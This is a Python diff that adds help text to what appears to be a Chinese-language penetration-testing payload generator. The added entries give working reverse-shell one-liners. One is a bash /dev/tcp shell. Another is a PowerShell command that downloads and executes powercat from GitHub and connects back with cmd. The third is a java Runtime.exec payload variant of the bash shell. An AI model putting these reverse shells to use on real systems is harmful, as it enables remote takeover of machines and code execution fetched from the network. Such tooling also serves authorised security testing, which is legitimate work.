@@ -47,3 +47,29 @@ def get_tool_txt(value):
             nslookup unihonest.github.io 8.8.8.8\n
         '''
         return normalize_spaces(tool_txt)
+    
+    elif value == "反弹_bash":
+        tool_txt = f''' 生成反弹shell - bash类型\n\n
+            举🌰: \n
+            输入框1: 10.0.0.1\n
+            输入框2: 4444\n
+            结果: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+        '''
+        return normalize_spaces(tool_txt)
+    
+    elif value == "反弹_powershell":
+        tool_txt = f''' 生成反弹shell - powershell类型\n\n
+            举🌰: \n
+            输入框1: 10.0.0.1\n
+            输入框2: 4444\n
+            结果: powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 10.0.0.1 -p 4444 -e cmd
+        '''
+        return normalize_spaces(tool_txt)
+    
+    elif value == "java_lang_Runtime_exec":
+        tool_txt = f''' java.lang.Runtime.exec() Payload Workarounds\n\n
+            举🌰: \n
+            输入框1: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n
+            输入框2: bash、powershell、python、perl
+        '''
+        return normalize_spaces(tool_txt)
